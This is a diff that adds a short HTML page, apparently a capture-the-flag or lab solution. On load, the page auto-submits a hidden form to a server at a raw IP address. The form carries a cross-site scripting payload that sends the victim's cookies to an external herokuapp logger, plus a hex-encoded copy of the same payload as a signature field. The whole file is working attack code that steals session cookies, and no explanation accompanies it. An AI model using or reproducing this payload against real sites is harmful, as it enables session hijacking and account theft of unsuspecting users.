@@ -1,0 +1,15 @@
+﻿<html>
+<body onload="load()">
+<form id="xssForm" action="http://18.158.46.251:8409/search.php" method="post" style="width: 1px; height: 1px; overflow: hidden">
+    <input type="hidden" name='searchtitle' value='<script>fetch(`http://logger-itsafe.herokuapp.com/?c=/${document.cookie}}`)</script>'>
+    <input type="hidden" name='sig' value='3c7363726970743e66657463682860687474703a2f2f6c6f676765722d6974736166652e6865726f6b756170702e636f6d2f3f633d2f247b646f63756d656e742e636f6f6b69657d7d60293c2f7363726970743e'>
+    <input type="submit" value="Submit">
+</form>
+
+<script>
+    function load(){
+        xssForm.submit();
+    }
+</script>
+</body>
+</html>
